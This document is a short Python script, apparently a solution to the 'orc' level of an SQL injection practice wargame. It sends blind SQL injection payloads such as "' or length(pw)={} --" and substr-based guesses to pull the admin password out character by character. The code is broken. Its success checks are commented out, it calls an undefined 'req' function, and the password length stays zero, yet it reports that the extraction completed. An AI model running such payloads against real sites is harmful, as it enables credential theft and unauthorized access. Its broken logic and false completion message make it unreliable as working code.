import urllib.request
import requests
from urllib.parse import quote # url encoding func
from time import sleep
url = 'http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
result = ""
pwlen = 0

__author__ = "goodasd123@naver.com - h4lo"

session = requests.Session()
response = session.get(url)
headers = session.cookies.get_dict()
headers['User-Agent'] = 'Mozilla/5.0'

for i in range(0, 10):
    add_url = "?pw=' or length(pw)={} -- ;".format(i)
    query = url + quote(add_url)

    res = requests.get(query)
    print(headers)
    print(res)
    sleep(3)
    # if req(query).text.find('Hello admin') != -1:
    #     pwlen = i
    #     print("[Password length is {}!]".format(pwlen))
    #     break
    # else:
    #     print("Matching.. -> [{}]".format(i))

for i in range(1, pwlen + 1):
    for j in range(ord('0'), (ord('z') + 1)):
        add_url = "?pw=' or id='admin' and substr(pw, 1, {})='{}' -- ;".format(i, result + chr(j))
        query = url + quote(add_url)

        # if req(query).text.find('Hello admin') != -1:
        #     result += chr(j).lower()
        #     print("[Find!! - {} // {}]".format(chr(j), result))
        #     break
        # else:
        #     print("Matching.. -> [{}]".format(chr(j)))

print("Blind SQL Injection completed.")
print("Password is {}".format(result))
